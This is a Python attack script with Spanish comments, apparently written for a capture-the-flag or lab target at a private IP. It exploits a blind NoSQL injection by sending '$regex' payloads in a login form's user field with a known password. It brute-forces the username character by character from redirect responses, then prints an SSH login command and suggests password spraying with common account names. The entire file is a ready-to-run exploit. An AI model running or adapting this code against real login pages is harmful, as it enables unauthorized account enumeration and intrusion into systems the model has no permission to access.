import requests
import string
import time
import sys
from dataclasses import dataclass, field
from typing import Optional, List

# ==========================================
# âš™ï¸ CONFIGURACIÃ“N DE ARQUITECTURA
# ==========================================
@dataclass
class TargetConfig:
    url: str = "http://10.65.131.251/login.php"
    known_password: str = "10584312"
    # Alfabeto para iterar el nombre de usuario
    chars: str = string.ascii_lowercase + string.digits + "_-" 

# ==========================================
# ðŸ•µï¸ IDENTITY HUNTER MODULE
# ==========================================
class NoSQLUserExtractor:
    """
    Clase avanzada para exfiltrar nombres de usuario basÃ¡ndonos en una password conocida via NoSQL Injection.
    """
    def __init__(self, config: TargetConfig):
        self.config = config
        self.session = requests.Session()

    def _check_payload(self, regex_payload: str) -> bool:
        """
        EnvÃ­a el payload malicioso.
        Si la respuesta es un 302 (Redirect) a /sekr3t o similar, es un HIT.
        """
        # IMPORTANTE: Inyectamos en 'user' usando $regex, pero fijamos la 'pass' correcta.
        data = {
            "user[$regex]": regex_payload,
            "pass": self.config.known_password,
            "remember": "on"
        }
        
        try:
            # No permitimos redirects para analizar la cabecera 'Location'
            r = self.session.post(self.config.url, data=data, allow_redirects=False, timeout=5)
            
            # Si nos redirige y NO es al error, hemos acertado
            if r.status_code == 302 and "err=1" not in r.headers.get("Location", ""):
                return True
            return False
        except Exception as e:
            sys.stdout.write(f"\n[!] Error de red: {e}")
            return False

    def extract_username(self) -> Optional[str]:
        print(f"[*] Iniciando extracciÃ³n de usuario para la pass: {self.config.known_password}")
        print(f"[*] Objetivo: {self.config.url}")
        print("[*] MÃ©todo: NoSQL Injection (Reverse Lookup)")
        print("-" * 50)

        extracted_user = ""
        
        # Bucle infinito hasta que dejemos de encontrar caracteres (o timeout)
        while True:
            char_found = False
            for char in self.config.chars:
                # Payload: ^usuario_que_llevamos + letra_actual
                payload = f"^{extracted_user}{char}"
                
                sys.stdout.write(f"\r[>] Probando: \033[1m{extracted_user}{char}...\033[0m")
                sys.stdout.flush()

                if self._check_payload(payload):
                    extracted_user += char
                    char_found = True
                    sys.stdout.write(f" -> \033[92mHIT!\033[0m\n")
                    break # Pasamos al siguiente carÃ¡cter
            
            if not char_found:
                # Verificamos si hemos terminado (regex de fin de cadena $)
                final_check = f"^{extracted_user}$"
                if self._check_payload(final_check):
                    print(f"\n" + "="*50)
                    print(f"âœ… USUARIO ENCONTRADO: \033[92m{extracted_user}\033[0m")
                    print("="*50)
                    return extracted_user
                else:
                    print("\n[!] No se encontraron mÃ¡s caracteres. Â¿QuizÃ¡s caracteres especiales?")
                    return None

# ==========================================
# ðŸš€ MAIN EXECUTION
# ==========================================
if __name__ == "__main__":
    # 1. Configura la IP correcta aquÃ­
    TARGET_IP = "10.65.131.251" 
    
    cfg = TargetConfig(url=f"http://{TARGET_IP}/login.php")
    hunter = NoSQLUserExtractor(cfg)
    
    # Â¡A CAZAR!
    user = hunter.extract_username()
    
    if user:
        print(f"\n[!!!] PRÃ“XIMO PASO: ConÃ©ctate por SSH ahora mismo.")
        print(f"      ssh {user}@{TARGET_IP}")
        print(f"      Password: {cfg.known_password}")
    else:
        print("\n[?] Fallo en la extracciÃ³n automÃ¡tica.")
        print("    Intenta un 'User Spray' manual con: root, superadmin, admin1, user, test.")